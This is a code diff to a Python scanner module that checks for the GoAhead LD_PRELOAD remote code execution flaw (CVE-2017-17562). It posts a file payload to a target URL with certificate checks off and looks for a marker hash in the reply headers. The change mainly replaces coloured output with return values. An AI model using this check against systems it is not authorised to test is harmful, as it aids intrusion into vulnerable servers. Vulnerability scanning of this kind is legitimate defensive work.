@@ -11,8 +11,7 @@ description: 该漏洞源于使用不受信任的HTTP请求参数初始化CGI脚
 import os
 import sys
 import requests
-import warnings
-from termcolor import cprint
+
 
 class goahead_LD_PRELOAD_rce_BaseVerify:
     def __init__(self, url):
@@ -29,12 +28,12 @@ class goahead_LD_PRELOAD_rce_BaseVerify:
             data = open(path, 'rb')
             req = requests.post(vulnurl, data=data, headers=headers, timeout=10, verify=False)
             if r"098f6bcd4621d373cade4e832627b4f6" in str(req.headers):
-                cprint("[+]存在GoAhead LD_PRELOAD远程代码执行(CVE-2017-17562)漏洞...(高危)\tpayload: "+vulnurl, "red")
-
+                return "[+]存在GoAhead LD_PRELOAD远程代码执行(CVE-2017-17562)漏洞...(高危)\tpayload: "+vulnurl
+            else:
+                return "[-]no vuln"
         except:
-            cprint("[-] "+__file__+"====>连接超时", "cyan")
+            return "[-] ======>连接超时"
 
 if __name__ == "__main__":
-    warnings.filterwarnings("ignore")
     testVuln = goahead_LD_PRELOAD_rce_BaseVerify(sys.argv[1])
     testVuln.run()
